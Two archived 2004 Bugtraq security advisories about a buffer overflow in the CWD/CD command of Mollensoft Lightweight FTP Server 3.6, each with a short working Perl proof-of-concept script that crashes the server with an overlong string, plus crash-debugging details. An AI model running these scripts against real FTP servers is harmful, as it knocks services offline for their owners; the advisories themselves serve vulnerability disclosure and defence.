=== Content from marc.info_078173fa_20250125_181653.html ===

```
[[prev in list](?l=bugtraq&m=108611028907289&w=2)] [[next in list](?l=bugtraq&m=108611051926194&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Mollensoft Lightweight FTP Server CWD Buffer Overflow
From:       [Aviram Jenik <aviram () beyondsecurity ! com>](?a=95859617100002&r=1&w=2)
Date:       [2004-06-01 17:13:03](?l=bugtraq&r=1&w=2&b=200406)
Message-ID: [200406012013.04025.aviram () beyondsecurity ! com](?i=200406012013.04025.aviram%20()%20beyondsecurity%20!%20com)
[Download RAW [message](?l=bugtraq&m=108611230015042&q=mbox) or [body](?l=bugtraq&m=108611230015042&q=raw)]

Mollensoft Lightweight FTP Server CWD Buffer Overflow
------------------------------------------------------------------------

Article reference:
<http://www.securiteam.com/windowsntfocus/5RP0L15CUM.html>

SUMMARY

STORM has discovered a security vulnerability in
<<http://www.mollensoft.com/product2.htm>> Mollensoft Lightweight FTP Server.
Mollensoft Lightweight FTP Server's support for the CWD command incorrectly
verifies that the buffer the CWD command doesn't overflow any of its internal
buffers. This insufficient verification allows an authenticated (anonymous or
otherwise) user to cause the FTP server to crash while trying to read an
arbitrary memory location by issuing a malformed CWD command.

DETAILS

Vulnerable Systems:
 * Mollensoft Lightweight FTP Server version 3.6

 Vendor Response:
BigAl (author) responded with the following:
I wrote this particular app with Visual Basic and used an FTP ActiveX COM
component and I am waiting for the component creator to get back to me
regarding the fix. Unfortunately I cannot snip off any of the commands, as
access to the command length is not available from the VB component using
straight VB Code. I am working on moving to .Net so hopefully I can have a
new FTP server out by fall time frame which is truly multi-threaded and
totally coded by me.

 Exploit:
 #!/usr/bin/perl
 #
 # Mollensoft FTP Server CMD Buffer Overflow
 #
 # Orkut users? Come join the SecuriTeam community
 # <http://www.orkut.com/Community.aspx?cmm=44441>

 use strict;
 use IO::Socket::INET;

 usage() unless (@ARGV == 2);

 my $host = shift(@ARGV);
 my $port = shift(@ARGV);

 # create the socket
 my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host,
PeerPort=>$port);
 $socket or die "Cannot connect to host!\n";

 $socket->autoflush(1);

 # receive greeting
 my $repcode = "220 ";
 my $response = recv_reply($socket, $repcode);
 print $response;

 # send USER command
 #my $username = "%00" x 2041;
 my $username = "anonymous";
 print "USER $username\r\n";
 print $socket "USER $username\r\n";

 select(undef, undef, undef, 0.002); # sleep of 2 milliseconds

 # send PASS command
 my $password = "a\@b.com";
 print "PASS $password\r\n";
 print $socket "PASS $password\r\n";

 my $cmd = "CWD ";
 $cmd .= "A" x 224; # Value can range from 224 to 1018
 $cmd .= "\r\n";
 print "length: ".length($cmd)."\n";
 print $socket $cmd;

 $repcode = "";
 recv_reply($socket, $repcode);

 close($socket);
 exit(0);

 sub usage
 {
  # print usage information
  print "\nUsage: Mollensoft_FTP_Server_crash.pl <host> <port>\n
 <host> - The host to connect to
 <port> - The TCP port which WarFTP is listening on\n\n";
  exit(1);
 }

 sub recv_reply
 {
  # retrieve any reply
  my $socket = shift;
  my $repcode = shift;
  $socket or die "Can't receive on socket\n";

  my $res="";
  while(<$socket>)
  {
   $res .= $_;
   if (/$repcode/) { last; }
  }
  return $res;
 }

ADDITIONAL INFORMATION
SecurITeam would like to thank <mailto:storm@securiteam.com> STORM for
finding this vulnerability.

Regards,
Aviram Jenik
Beyond Security Ltd.

<http://www.BeyondSecurity.com>
<http://www.SecuriTeam.com>

The First Integrated Network and Web Application Vulnerability Scanner:
<http://www.beyondsecurity.com/webscan-wp.pdf>

====================
====================

DISCLAIMER:
The information in this bulletin is provided "AS IS" without warranty of any
kind.
In no event shall we be liable for any damages whatsoever including direct,
indirect, incidental, consequential, loss of business profits or special
damages.
[[prev in list](?l=bugtraq&m=108611028907289&w=2)] [[next in list](?l=bugtraq&m=108611051926194&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_c2b6c646_20250125_181652.html ===

```
[[prev in list](?l=bugtraq&m=108576228420027&w=2)] [[next in list](?l=bugtraq&m=108601906031541&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Mollensoft ftp Server ver 3.6 Buffer overflow
From:       [Chintan Trivedi <chesschintan () hotmail ! com>](?a=107110012700004&r=1&w=2)
Date:       [2004-05-28 5:38:45](?l=bugtraq&r=1&w=2&b=200405)
Message-ID: [20040528053845.14885.qmail () www ! securityfocus ! com](?i=20040528053845.14885.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=108577846011604&q=mbox) or [body](?l=bugtraq&m=108577846011604&q=raw)]

[ Mollensoft ftp Server ver 3.6 Buffer overflow ]

-----------------------------------------------------
EOS Advisory - <http://www.eos-india.net>
-----------------------------------------------------

Vendor         : <http://www.mollensoft.com>
Version	       : 3.6 (latest)
Vulnerability  : Buffer Overflow

About Product
=============

	Mollensoft Lightweight FTP Server is a powerful, reliable FTP server for \
Windows95/98/NT/2000. It includes New Security and Faster, More Efficient Rules Based \
Access, Live Client activity Window as well as a specific Client breakdown window \
(below) and significant enhancement in speed/stability and is especially designed for \
Intranet Use!

(direct quote from website)

Description
===========

	A buffer overflow vulnerability exists in its "CD" command which can lead to READ \
any memory location. An attacker can pass a string of 238 bytes to the "CD" command \
to cause this overflow.

ftp> CD AAAAAAA...(238 times)

The ftpd deamon at this point crashes with an error message saying

"The instruction at 0x50e0931f referenced memory at 0x41414141. The memory could not \
be read."

	On debugging the process, the instruction at memory location "0x50E0931F" is found \
to be "CMP BYTE PTR DS:[ESI], 1F" And the register ESI contains "41414141". So \
basically the application is trying to READ from 0x41414141. Thus in this manner an \
attacker can force the application to READ from any memory location. In worst cases \
if properly exploited the vulnerability can also lead to a remote exploit giving \
complete access to the vulnerable system.

Proof Of Concept
================

# C:\Active Perl\perl
# POC for mollensoft ftp server 3.6
# Will crash the deamon

use IO::Socket::INET;

$host = "localhost";
$port = 21;
$buffer = "A" x 238;

$socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);

print $socket "USER root\r\n";
$socket->recv($test,100);
print $test;

print $socket "PASS password\r\n";
$socket->recv($test,100);
print $test;

print $socket "CD $buffer\r\n";
$socket->recv($test,100);
print $test;

close($socket);

Credits
=======

Chintan Trivedi - chesschintan [at] hotmail.com
<http://www.eos-india.net>
Eye on Security Research Group - India

[[prev in list](?l=bugtraq&m=108576228420027&w=2)] [[next in list](?l=bugtraq&m=108601906031541&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


